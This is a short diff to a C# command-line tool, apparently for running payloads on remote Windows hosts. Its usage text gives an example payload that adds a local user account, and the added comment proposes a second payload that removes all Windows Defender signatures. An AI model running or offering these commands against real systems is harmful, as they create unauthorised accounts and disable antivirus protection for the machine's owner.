@@ -28,6 +28,7 @@ namespace lat
             {
                 Console.WriteLine("[!] Usage: .\\lat.exe target payload");
                 Console.WriteLine("[!] Example: .\\lat.exe file02 \"net user trike Trike33_$! /add /y\"");
+                //You can use this payload alternatively to delete signatures from Windows Defender: C:\Program Files\Windows Defender\MpCmdRun.exe -RemoveDefinitions -All
             	return;
             }
 
